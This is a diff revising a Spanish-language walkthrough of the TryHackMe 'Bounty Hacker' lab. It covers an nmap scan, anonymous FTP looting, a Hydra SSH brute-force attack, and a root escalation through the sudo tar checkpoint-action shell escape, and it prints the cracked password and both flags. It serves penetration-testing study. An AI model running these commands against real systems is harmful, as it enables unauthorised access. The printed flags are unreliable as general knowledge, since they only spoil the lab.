@@ -2,58 +2,63 @@
 
 ## Escaneo de puertos
 
-Realizamos un mapeo de puertos para ver que servicios están disponibles y son vulnerables mediante el uso de`nmap`.
+Realizamos un mapeo de puertos para identificar servicios disponibles con `nmap`:
 
-```
+```bash
 sudo nmap -sV -T4 -p- 10.10.85.142
 ```
 
-Tenemos tres puertos abiertos, el 21 (FTP), el 22 (SSH) y el 80 (HTTP).
+Se detectan tres puertos abiertos:
 
-![](Hacking_Etico/TryHackMe_WriteUps/Bounty_Hacker/images/image.png)
+* 21: FTP
+* 22: SSH
+* 80: HTTP
+
+![](images/image.png)
 
 ## Acceso por FTP
 
-Accedemos de forma anónima al servidor FTP. Desactivamos el modo pasivo, de esta forma es el servidor el que inicia la conexión.
+Conectamos anónimamente al FTP y desactivamos el modo pasivo para que sea el servidor quien inicie la conexión:
 
-![](Hacking_Etico/TryHackMe_WriteUps/Bounty_Hacker/images/image-1.png)
+![](images/image-1.png)
 
-Encontramos dos archivos y los descargamos con el comando`get`.
+Listamos los archivos y los descargamos con `get`:
 
-![](Hacking_Etico/TryHackMe_WriteUps/Bounty_Hacker/images/image-2.png)
+![](images/image-2.png)
 
-En el archivo`task.txt`encontramos a un usuario llamado`lin`.
+En `task.txt` aparece un usuario llamado `lin`:
 
-![](Hacking_Etico/TryHackMe_WriteUps/Bounty_Hacker/images/image-3.png)
+![](images/image-3.png)
 
-Y en el de`locks.txt`varias contraseñas que podrían ser la de usuario.
+Y en `locks.txt` varias posibles contraseñas:
 
-![](Hacking_Etico/TryHackMe_WriteUps/Bounty_Hacker/images/image-4.png)
+![](images/image-4.png)
 
 ## Ataque de fuerza bruta con Hydra
 
-Usando como diccionario el archivo`locks.txt`, ejecutamos un ataque de fuerza bruta online sobre el servicio SSH con la herramienta`hydra`.
+Usamos `locks.txt` como diccionario contra SSH para el usuario `lin`:
 
-```
-hydra -l lin -P locks.txt ssh://10.10.85.142 
+```bash
+hydra -l lin -P locks.txt ssh://10.10.85.142
 ```
 
-La contraseña de`lin`es `RedDr4gonSynd1cat3`.
-![](Hacking_Etico/TryHackMe_WriteUps/Bounty_Hacker/images/image-5.png)
+La contraseña obtenida es **RedDr4gonSynd1cat3**.
+
+![](images/image-5.png)
 
 ## Acceso por SSH
 
-Mediante los credenciales obtenidos, entramos por el servicio SSH.
+Accedemos al sistema con `lin`:
 
+```bash
+ssh lin@10.10.85.142
 ```
-ssh lin@10.10.85.142  
-```
 
-![](Hacking_Etico/TryHackMe_WriteUps/Bounty_Hacker/images/image-6.png)
+![](images/image-6.png)
 
-Obtenemos la flag del`user.txt`.
+Leemos la flag de usuario en `user.txt`:
 
-![](Hacking_Etico/TryHackMe_WriteUps/Bounty_Hacker/images/image-7.png)
+![](images/image-7.png)
 
 ```
 THM{CR1M3_SyNd1C4T3}
@@ -61,35 +66,30 @@ THM{CR1M3_SyNd1C4T3}
 
 ## Escalada de privilegios
 
-Comprobamos los permisos de sudo que tiene el usuario para ver si hay algún binario explotable para obtener privilegios de root.
+Comprobamos los permisos de sudo del usuario:
 
-```
+```bash
 sudo -l
 ```
 
-![](Hacking_Etico/TryHackMe_WriteUps/Bounty_Hacker/images/image-8.png)
+![](images/image-8.png)
 
-El binario`/bin/tar`puede explotarse según [GTFOBins](https://gtfobins.github.io/gtfobins/tar/).
+Vemos que `/bin/tar` puede usarse con privilegios según GTFOBins:
 
-![](Hacking_Etico/TryHackMe_WriteUps/Bounty_Hacker/images/image-9.png)
+![](images/image-9.png)
 
-Ejecutamos el comando directamente y somos root.
+Ejecutamos:
 
-```
+```bash
 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
 
-![](Hacking_Etico/TryHackMe_WriteUps/Bounty_Hacker/images/image-10.png)
+![](images/image-10.png)
 
-Nos ubicamos en la carpeta de root y obtenemos la flag final.
+Obtenemos shell como root, navegamos a `/root` y leemos la flag:
 
-![](Hacking_Etico/TryHackMe_WriteUps/Bounty_Hacker/images/image-11.png)
+![](images/image-11.png)
 
 ```
 THM{80UN7Y_h4cK3r}
 ```
-
-
-
-
-
